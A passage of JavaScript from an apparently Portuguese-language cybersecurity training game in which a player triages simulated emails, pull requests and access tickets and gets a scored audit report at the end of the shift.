    this.diconIam.addEventListener('click', () => {
      audio.click();
      this.setCategoryView('iam');
    });

    // Back to Inbox buttons
    this.btnBackToInbox.addEventListener('click', () => {
      audio.click();
      this.showInboxList();
    });
    this.browserBackBtn.addEventListener('click', () => {
      audio.click();
      this.showInboxList();
    });
    this.browserRefreshBtn.addEventListener('click', () => {
      audio.click();
      this.renderInboxRows();
      this.showToast('Caixa de entrada sincronizada.');
    });

    // Toggle Technical Headers dropdown in reader
    this.btnToggleHeaders.addEventListener('click', () => {
      audio.click();
      const isHidden = this.technicalHeadersBox.style.display === 'none';
      this.technicalHeadersBox.style.display = isHidden ? 'flex' : 'none';
      this.btnToggleHeaders.textContent = isHidden ? 'Ocultar Detalhes ▴' : 'Detalhes de Segurança ▾';
    });

    // Category Tabs in Webmail
    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(tab => {
      tab.addEventListener('click', (e) => {
        audio.click();
        const target = e.currentTarget;
        const cat = target.getAttribute('data-cat');
        this.setCategoryView(cat);
      });
    });

    // Sidebar navigation folders
    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(item => {
      item.addEventListener('click', (e) => {
        audio.click();
        const target = e.currentTarget;
        const view = target.getAttribute('data-view');
        this.setCategoryView(view);
      });
    });

    // Restart shift button in final audit report
    this.btnRestartShift.addEventListener('click', () => {
      audio.click();
      this.restartShift();
    });
  }

  setCategoryView(view) {
    this.currentCategoryFilter = view;

    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(i => {
      i.classList.toggle('active', i.getAttribute('data-view') === view);
    });

    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(t => {
      t.classList.toggle('active', t.getAttribute('data-cat') === view);
    });

    this.showInboxList();
    this.renderInboxRows();
  }

  startShift() {
    this.startScreen.style.display = 'none';
    this.mainWorkspace.style.display = 'flex';
    this.currentIndex = 0;
    this.processedItems = [];
    this.decisionsHistory = [];
    
    this.updateBadges();
    this.showInboxList();
    this.renderInboxRows();
  }

  restartShift() {
    this.auditReportView.style.display = 'none';
    this.mainWorkspace.style.display = 'none';
    this.startScreen.style.display = 'flex';
  }

  showInboxList() {
    this.emailReaderView.style.display = 'none';
    this.auditReportView.style.display = 'none';
    this.inboxListView.style.display = 'flex';
    this.renderInboxRows();
  }

  updateBadges() {
    const unread = SCENARIOS.filter((_, idx) => !this.processedItems.includes(idx));
    const unreadEmail = unread.filter(s => s.channel === 'email').length;
    const unreadGithub = unread.filter(s => s.channel === 'github').length;
    const unreadIam = unread.filter(s => s.channel === 'iam').length;

    this.badgeEmailCount.textContent = unreadEmail;
    this.badgeGithubCount.textContent = unreadGithub;
    this.badgeIamCount.textContent = unreadIam;
    this.badgeDoneCount.textContent = this.processedItems.length;

    this.tabEmailTag.textContent = `${unreadEmail} novos`;
    this.tabGithubTag.textContent = `${unreadGithub} novos`;
    this.tabIamTag.textContent = `${unreadIam} novos`;
    
    // Update shift clock
    const activeItem = SCENARIOS[this.processedItems.length] || SCENARIOS[SCENARIOS.length - 1];
    const timeStr = this.processedItems.length >= SCENARIOS.length ? '18:00' : activeItem.time;
    this.shiftClock.textContent = timeStr;
    this.taskbarClock.textContent = timeStr;
  }

  renderInboxRows() {
    this.emailItemsContainer.innerHTML = '';

    SCENARIOS.forEach((item, index) => {
      const isProcessed = this.processedItems.includes(index);

      // Filtering
      if (this.currentCategoryFilter === 'processed') {
        if (!isProcessed) return;
      } else if (this.currentCategoryFilter !== 'all' && item.channel !== this.currentCategoryFilter) {
        return;
      }

      const row = document.createElement('div');
      row.className = `email-row-item ${!isProcessed ? 'unread' : 'processed'}`;
      
      let tagLabel = 'TechMail';
      let tagClass = 'tag-email';
      if (item.channel === 'github') { tagLabel = 'GitHub PR'; tagClass = 'tag-github'; }
      if (item.channel === 'iam') { tagLabel = 'IAM Access'; tagClass = 'tag-iam'; }

      row.innerHTML = `
        <div class="row-controls">
          <input type="checkbox" ${isProcessed ? 'checked' : ''} onclick="event.stopPropagation()">
          <span class="row-star" onclick="event.stopPropagation(); this.classList.toggle('starred')">★</span>
        </div>
        <span class="row-tag ${tagClass}">${tagLabel}</span>
        <div class="row-sender">${this.escapeHtml(item.senderName)}</div>
        <div class="row-content">
          ${!isProcessed ? '<span class="row-new-badge">NOVO</span>' : ''}
          <span class="row-subject">${this.escapeHtml(item.subject)}</span>
          <span class="row-snippet"> - ${this.escapeHtml(item.snippet)}</span>
        </div>
        <div class="row-time">${item.time}</div>
      `;

      row.addEventListener('click', () => {
        audio.openMail();
        this.openReader(index);
      });

      this.emailItemsContainer.appendChild(row);
    });

    if (this.emailItemsContainer.children.length === 0) {
      this.emailItemsContainer.innerHTML = `
        <div style="padding: 40px; text-align: center; color: #747775;">
          <div style="font-size: 32px; margin-bottom: 8px;">📭</div>
          <p>Nenhuma mensagem nesta visualização.</p>
        </div>
      `;
    }
  }

  openReader(index) {
    const item = SCENARIOS[index];
    const isProcessed = this.processedItems.includes(index);

    this.inboxListView.style.display = 'none';
    this.emailReaderView.style.display = 'flex';
    this.technicalHeadersBox.style.display = 'none';
    this.btnToggleHeaders.textContent = 'Detalhes de Segurança ▾';

    let typeText = 'E-MAIL CORPORATIVO';
    if (item.channel === 'github') typeText = 'GITHUB PULL REQUEST';
    if (item.channel === 'iam') typeText = 'CHAMADO DE ACESSO IAM';

    this.readerTypeTag.textContent = typeText;
    this.readerTimeMeta.textContent = item.time;
    this.readerSubjectTitle.textContent = item.subject;

    this.readerSenderAvatar.textContent = item.avatarChar;
    this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
    this.readerSenderName.textContent = item.senderName;
    this.readerSenderEmail.textContent = `<${item.senderEmail}>`;
    this.readerReceivedTime.textContent = item.meta['Data'] || item.time;

    this.headerDe.textContent = item.meta['De'];
    this.headerPara.textContent = item.meta['Para'];
    this.headerData.textContent = item.meta['Data'];
    this.headerAuth.textContent = item.meta['Segurança'];

    this.readerBodyMessage.innerHTML = item.body;

    // Render Inspector
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO ANALISADO:</span>
          <span class="url-dest">${item.inspector.dest}</span>
          <small style="color: #cbd5e1; margin-top: 4px; display: block;">${item.inspector.details}</small>
        </div>
      `;
    }

    // Render Decision Buttons
    if (isProcessed) {
      this.decisionButtonsGroup.innerHTML = `
        <div style="font-size: 13px; color: #188038; font-weight: 600;">
          ✓ Este item já foi processado anteriormente durante este expediente.
        </div>
      `;
    } else {
      this.decisionButtonsGroup.innerHTML = item.actions.map(action => {
        let btnClass = 'btn-decision-secondary';
        if (action.type === 'danger') btnClass = 'btn-decision-danger';
        if (action.type === 'success') btnClass = 'btn-decision-success';
        if (action.type === 'primary') btnClass = 'btn-decision-primary';

        return `
          <button class="btn-decision ${btnClass}" data-action-id="${action.id}">
            ${action.label}
          </button>
        `;
      }).join('');

      this.decisionButtonsGroup.querySelectorAll('.btn-decision').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const actionId = e.currentTarget.getAttribute('data-action-id');
          const chosenAction = item.actions.find(a => a.id === actionId);
          this.processAction(index, item, chosenAction);
        });
      });
    }
  }

  processAction(index, item, action) {
    audio.actionDone();

    this.processedItems.push(index);
    this.decisionsHistory.push({
      scenarioIndex: index,
      channel: item.channel,
      subject: item.subject,
      chosenActionLabel: action.label,
      logTitle: action.logTitle,
      correct: action.correct,
      consequence: action.consequence,
      explanation: action.explanation
    });

    this.showToast(action.toastMsg);
    this.updateBadges();

    if (this.processedItems.length >= SCENARIOS.length) {
      setTimeout(() => {
        this.showFinalAuditReport();
      }, 700);
    } else {
      setTimeout(() => {
        this.showInboxList();
      }, 500);
    }
  }

  showToast(msg) {
    this.toastMsg.textContent = msg;
    this.actionToast.style.display = 'flex';
    setTimeout(() => {
      this.actionToast.style.display = 'none';
    }, 2400);
  }

  showFinalAuditReport() {
    audio.endFanfare();

    this.emailReaderView.style.display = 'none';
    this.inboxListView.style.display = 'none';
    this.auditReportView.style.display = 'flex';
    this.shiftClock.textContent = '18:00';
    this.taskbarClock.textContent = '18:00';

    const totalScenarios = SCENARIOS.length;
    const correctCount = this.decisionsHistory.filter(d => d.correct).length;
    const incorrectCount = totalScenarios - correctCount;

    const health = Math.max(0, 100 - (incorrectCount * 25));
    const reputation = Math.max(0, 100 - (incorrectCount * 15) + (correctCount * 5));

    this.reportThreatsAvoided.textContent = correctCount;
    this.reportThreatsTaken.textContent = incorrectCount;
    this.reportHealthFinal.textContent = `${health}%`;
    this.reportHealthFinal.className = health >= 75 ? 'card-num text-emerald' : (health >= 50 ? 'card-num text-amber' : 'card-num text-danger');
    this.reportReputationFinal.textContent = `${reputation} pts`;

    if (incorrectCount === 0) {
      this.auditStamp.textContent = 'CISO APPROVED // PROMOÇÃO A SÊNIOR';
      this.auditTitle.textContent = '🏆 DEFESA CIBERNÉTICA IMPECÁVEL!';
      this.auditVerdictTitle.textContent = 'Parecer do CISO: Aprovado com Louvor (Staff SecOps)';
      this.auditVerdictText.textContent = 'Parabéns! Você identificou 100% dos ataques de phishing, supply chain no CI/CD, malwares e backdoors, preservando a total integridade dos servidores e credenciais da TechCore.';
    } else if (incorrectCount <= 2 && health >= 50) {
      this.auditStamp.textContent = 'AUDITORIA FINALIZADA COM RESSALVAS';
      this.auditTitle.textContent = '⚠️ TURNO CONCLUÍDO COM INCIDENTES LEVES';
      this.auditVerdictTitle.textContent = 'Parecer do CISO: Advertência Formal & Retreinamento';
      this.auditVerdictText.textContent = 'A infraestrutura da empresa sobreviveu, mas alguns incidentes de segurança ocorreram. Revise a tabela pós-mortem abaixo para reforçar os pontos de atenção da Guia de Referência.';
    } else {
      this.auditStamp.textContent = 'DEMISSÃO POR JUSTA CAUSA // INCIDENTE CRÍTICO';
      this.auditTitle.textContent = '🚨 COMPROMETIMENTO GRAVE DA INFRAESTRUTURA';
      this.auditVerdictTitle.textContent = 'Parecer do CISO: Demitido / Vazamento Massivo de Dados';
      this.auditVerdictText.textContent = 'Credenciais corporativas foram vazadas e servidores de produção foram invadidos por backdoors/miners devido a decisões inadequadas durante o turno.';
    }

    this.auditTableBody.innerHTML = this.decisionsHistory.map((item, idx) => `
      <tr>
        <td><strong>#${idx + 1}</strong></td>
        <td><span class="row-tag ${item.channel === 'email' ? 'tag-email' : (item.channel === 'github' ? 'tag-github' : 'tag-iam')}">${item.channel.toUpperCase()}</span></td>
        <td><strong>${this.escapeHtml(item.subject)}</strong></td>
        <td>${this.escapeHtml(item.chosenActionLabel)}</td>
        <td><strong style="color: ${item.correct ? 'var(--google-green)' : 'var(--google-red)'};">${item.correct ? '✅ ACERTO' : '❌ INCIDENTE'}</strong></td>
        <td style="font-size: 11.5px; color: #444746; line-height: 1.4;">
          <strong>${this.escapeHtml(item.logTitle)}:</strong> ${this.escapeHtml(item.consequence)}<br>
          <em style="color: #747775;">${this.escapeHtml(item.explanation)}</em>
        </td>
      </tr>
    `).join('');
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
}

// Start Simulator
window.addEventListener('DOMContentLoaded', () => {
  window.simulator = new TechMailSimulator();
});
